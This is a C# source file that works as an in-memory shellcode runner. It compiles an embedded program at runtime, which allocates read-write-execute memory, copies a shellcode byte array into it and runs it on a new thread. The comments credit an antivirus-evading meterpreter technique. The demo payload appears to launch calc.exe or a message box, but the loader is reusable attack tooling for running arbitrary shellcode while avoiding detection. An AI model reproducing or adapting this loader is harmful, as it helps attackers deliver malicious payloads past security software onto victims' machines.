using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Reflection;
using System.CodeDom.Compiler;
using Microsoft.CSharp;


namespace Asm
{
    internal class Program
    {

        //using https://webstersprodigy.net/2012/08/31/av-evading-meterpreter-shell-from-a-net-service/ 
        // and using https://raw.githubusercontent.com/vysec/FSharp-Shellcode/master/FSharp-Shellcode.fs as base
        // and using https://stackoverflow.com/questions/1361965/compile-simple-string 
        // shellcode test from https://www.exploit-db.com/exploits/28996/ for msgbox popup
        static void Main(string[] args)
        {
            string code = @"
                            using System;
                            using System.Reflection;
                            using System.Runtime.InteropServices;
                            namespace Namespace
                            {
                                class Program
                                {
                                    private static UInt32 MEM_COMMIT = 0x1000;
                                    private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
                                    [DllImport(""kernel32"")]
                                    private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
                                            UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
                                    [DllImport(""kernel32"")]
                                    private static extern IntPtr CreateThread(
                                        UInt32 lpThreadAttributes,
                                        UInt32 dwStackSize,
                                        UInt32 lpStartAddress,
                                        IntPtr param,
                                        UInt32 dwCreationFlags,
                                        ref UInt32 lpThreadId
                                        );
                                    [DllImport(""kernel32"")]
                                    private static extern UInt32 WaitForSingleObject(
                                        IntPtr hHandle,
                                        UInt32 dwMilliseconds
                                        );
                                    public void run()
                                    {
                                        //Broken Byte msgbox test                                       
                                                   byte[] shellcode = new byte[193] {
                                                        0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,
                                                        0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,
                                                        0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,
                                                        0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,
                                                        0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,
                                                        0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,
                                                        0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,
                                                        0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,
                                                        0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,
                                                        0x8d,0x5d,0x6a,0x01,0x8d,0x85,0xb2,0x00,0x00,0x00,0x50,0x68,0x31,0x8b,0x6f,
                                                        0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x68,0xa6,0x95,0xbd,0x9d,0xff,0xd5,
                                                        0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,
                                                        0x00,0x53,0xff,0xd5,0x63,0x61,0x6c,0x63,0x2e,0x65,0x78,0x65,0x00
                                                        };
                                        UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
                                        Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
                                        IntPtr hThread = IntPtr.Zero;
                                        UInt32 threadId = 0;
                                        IntPtr pinfo = IntPtr.Zero;
                                        hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
                                        WaitForSingleObject(hThread, 0xFFFFFFFF);
                                    }
                                }
                            }";
            function1(code, "Namespace", "Program", "run", false, null);
        }



        public static object function1(string code, string namespacename, string classname, string functionname, bool isstatic, params object[] args)
        {
            object returnval = null;
            Assembly asm = BuildAssembly(code);
            object instance = null;
            Type type = null;
            if (isstatic)
            {
                type = asm.GetType(namespacename + "." + classname);
            }
            else
            {
                instance = asm.CreateInstance(namespacename + "." + classname);
                type = instance.GetType();
            }
            MethodInfo method = type.GetMethod(functionname);
            returnval = method.Invoke(instance, args);
            return returnval;
        }

        private static Assembly BuildAssembly(string code)
        {
            Microsoft.CSharp.CSharpCodeProvider provider = new CSharpCodeProvider();
            ICodeCompiler compiler = provider.CreateCompiler();
            CompilerParameters compilerparams = new CompilerParameters();
            compilerparams.GenerateExecutable = false;
            compilerparams.GenerateInMemory = true;
            CompilerResults results = compiler.CompileAssemblyFromSource(compilerparams, code);
            return results.CompiledAssembly;
        }

    }
}
